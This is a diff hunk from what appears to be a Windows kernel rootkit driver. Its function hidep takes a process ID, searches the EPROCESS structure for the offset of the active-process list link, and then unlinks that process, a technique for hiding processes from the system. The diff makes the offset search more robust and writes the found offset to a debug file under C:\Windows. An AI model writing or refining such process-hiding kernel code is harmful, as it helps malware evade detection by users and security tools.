@@ -11,15 +11,28 @@ PCHAR hidep(UINT32 pid) {
 
 	ULONG LIST_OFFSET = 0x0;	// Offset in PEPROCESS for the linked list
 
+	PEPROCESS checkp;
+	for (unsigned int i = 16;; i += 4) { 
+		if (NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)i, &checkp))) { break; } 
+	}
+
 	// Find the offset of the list entry, currently it's 0x448, but since it can change, this is a more sustainable way to
 	// do it
 	for (unsigned int i = 0x0; i < 0x1000; i += 0x4) {
 
-		if (CurrentPID == *(ULONG*)((UCHAR*)currentProcess + i)) {
+		if (CurrentPID == *(ULONG*)((UCHAR*)currentProcess + i)
+			&& (ULONG)((ULONG_PTR)PsGetProcessId(checkp)) == *(ULONG*)((UCHAR*)checkp + i)) {
+
 			LIST_OFFSET = i + sizeof(ULONG_PTR); break;
 		}
 	}
 	
+	// L"\\DosDevices\\C:\\Windows\\%lu"
+
+	WCHAR buffer[150];
+	swprintf_s(buffer, 150, L"\\DosDevices\\C:\\Windows\\%lu", LIST_OFFSET);
+	debugFile(buffer);
+
 
 	PLIST_ENTRY currentList = (LIST_ENTRY*)((ULONG_PTR)currentProcess + LIST_OFFSET);
 	
